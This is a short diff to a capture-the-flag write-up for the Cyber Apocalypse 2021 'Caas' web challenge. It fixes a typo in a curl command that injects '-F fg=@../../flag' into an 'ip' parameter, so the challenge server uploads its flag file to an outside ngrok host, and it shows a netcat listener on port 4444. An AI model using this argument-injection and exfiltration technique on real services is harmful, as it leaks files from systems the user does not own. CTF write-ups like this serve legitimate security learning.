@@ -4,7 +4,7 @@
 |:--    |:--|
 Type    |CTF / Web
 Name    | **Cyber Apocalypse 2021 / Caas**
-Started | 2021/04/23 07:30 AM
+Started | 2021/04/23
 URLs    | https://ctf.hackthebox.eu/ctf/82
 |       | https://ctftime.org/event/1304
 Author  | **Asentinn** / OkabeRintaro
@@ -310,7 +310,7 @@ listening on [any] 4444 ...
 And to retrieve the flag (from downloadable we know that flag is located 2 levels above the working directory of the script):
 
 ```
-url -H "application/x-www-form-urlencoded" -d 'ip=-F fg=@../../flag 1f106a9e85a2.ngrok.io' -v 138.68.178.56:32236/api/curl
+curl -H "application/x-www-form-urlencoded" -d 'ip=-F fg=@../../flag 1f106a9e85a2.ngrok.io' -v 138.68.178.56:32236/api/curl
 ```
 
 **Bingo**.
